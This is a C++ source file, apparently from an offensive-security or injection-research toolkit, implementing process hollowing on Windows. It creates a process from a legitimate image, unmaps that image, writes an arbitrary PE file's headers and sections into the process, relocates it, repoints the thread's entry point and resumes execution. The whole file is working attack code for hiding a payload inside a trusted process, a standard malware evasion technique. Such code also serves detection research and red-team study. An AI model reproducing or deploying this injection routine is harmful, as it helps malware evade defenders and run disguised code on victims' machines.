#include <cstdio>
#include <string>

#include "common.h"
#include "scripts.h"
#include "sysapi.h"
#include "unique_memory.h"


namespace scripts {

bool inject_create_process_hollow(const std::wstring& original_image,
                                  const std::wstring& injected_image,
                                  RemoteProcessMemoryMethod method) {

    wprintf(L"\nPreparing a new process\n");

    wprintf(L"  [*] creating process...\n");

    auto process = sysapi::ProcessCreateUser(original_image, true);
    if (process.hProcess == NULL) {
        return false;
    }

    wprintf(L"  [*] getting process PEB address...\n");

    PROCESS_BASIC_INFORMATION BasicInfo;
    auto res = sysapi::ProcessGetBasicInfo(process.hProcess.get(), BasicInfo);
    if (!res) {
        return false;
    }

    auto process_peb = process_read_peb(process.hProcess.get());
    if (process_peb.data() == NULL) {
        return false;
    }

    wprintf(L"\nPreparing the injected image\n");
    wprintf(L"  [*] opening image...\n");

    sysapi::unique_handle ImageHandle = sysapi::FileOpen(injected_image.c_str());
    if (ImageHandle == NULL) {
        return false;
    }

    wprintf(L"  [*] getting image file size...\n");

    size_t FileSize = sysapi::FileGetSize(ImageHandle.get());
    if (FileSize == NULL) {
        return false;
    }

    wprintf(L"  [*] mapping image file...\n");

    auto ImageFileSection = sysapi::SectionFileCreate(ImageHandle.get(), SECTION_MAP_READ, PAGE_READONLY);
    if (ImageFileSection == NULL) {
        return false;
    }

    // TODO: RAII
    auto* ImageFileBuffer = sysapi::SectionMapView(ImageFileSection, FileSize, PAGE_READONLY);
    if (ImageFileBuffer == NULL)
    {
        return false;
    }

    auto* pDOSHeader = (PIMAGE_DOS_HEADER)ImageFileBuffer;
    auto* pNT32Header = (PIMAGE_NT_HEADERS32)PTR_ADD(ImageFileBuffer, pDOSHeader->e_lfanew);
    auto* pNT64Header = (PIMAGE_NT_HEADERS64)pNT32Header;

    bool is_64 = pNT32Header->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;

    RemoteProcessMemoryContext ctx;
    ctx.method = method;
    ctx.ProcessHandle = process.hProcess.get();
    ctx.Size = pNT32Header->OptionalHeader.SizeOfImage;

    wprintf(L"\nPlacing the new image in the target process\n");

    if (ctx.method == RemoteProcessMemoryMethod::CreateSectionMap ||
        ctx.method == RemoteProcessMemoryMethod::CreateSectionMapLocalMap) {

        ctx.RemoteBaseAddress = process_peb->ImageBaseAddress;

        wprintf(L"  [*] unmapping original process image section...\n");

        res = sysapi::SectionUnmapView(ctx.RemoteBaseAddress, process.hProcess.get());
        if (!res) {
            return false;
        }
    }

    res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    wprintf(L"\nWriting new image\n");
    wprintf(L"  [*] writing headers at 0x%p...\n", process_peb->ImageBaseAddress);

    res = process_write_memory(ctx, 0, ImageFileBuffer, pNT32Header->OptionalHeader.SizeOfHeaders);
    if (!res) {
        return false;
    }

    auto* pSections = (PIMAGE_SECTION_HEADER)PTR_ADD(ImageFileBuffer, pDOSHeader->e_lfanew + (is_64 ? sizeof(IMAGE_NT_HEADERS64) : sizeof(IMAGE_NT_HEADERS32)));

    for (ULONG i = 0; i < pNT32Header->FileHeader.NumberOfSections; i++) {

        if (!pSections[i].PointerToRawData) {
            continue;
        }

        wprintf(L"  [*] writing %hs section at 0x%p...\n", (char*)pSections[i].Name, PTR_ADD(process_peb->ImageBaseAddress, pSections[i].VirtualAddress));

        res = process_write_memory(ctx, pSections[i].VirtualAddress, PTR_ADD(ImageFileBuffer, pSections[i].PointerToRawData), pSections[i].SizeOfRawData);
        if (!res) {
            return false;
        }
    }

    wprintf(L"\nRelocating image\n");

    res = process_pe_image_relocate(ctx, ImageFileBuffer);
    if (!res) {
        return false;
    }

    wprintf(L"\nFixing thread\n");

    if (is_64) {
        res = thread_set_execute<true, true>(process.hThread.get(), PTR_ADD(process_peb->ImageBaseAddress, pNT64Header->OptionalHeader.AddressOfEntryPoint));
    }
    else {
        res = thread_set_execute<true, false>(process.hThread.get(), PTR_ADD(process_peb->ImageBaseAddress, pNT32Header->OptionalHeader.AddressOfEntryPoint));
    }

    wprintf(L"  [*] resuming thread...\n");

    if (!ResumeThread(process.hThread.get())) {
        return false;
    }

    wprintf(L"\nSuccess\n");
    return true;
}

}
